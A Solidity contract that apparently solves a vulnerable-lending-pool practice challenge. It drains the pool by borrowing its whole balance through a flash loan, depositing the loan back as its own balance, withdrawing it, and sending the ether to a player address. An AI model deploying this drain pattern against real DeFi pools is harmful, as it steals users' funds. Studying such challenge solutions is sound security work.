// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract AttackSide is IFlashLoanEtherReceiver {

    SideEntranceLenderPool pool;
    address payable player;

    constructor(address _pool, address _player) {
        pool = SideEntranceLenderPool(_pool);
        player = payable(_player);
    }

    function attack() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        (bool success,) = player.call{value: address(this).balance}("");
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    receive() payable external {}
}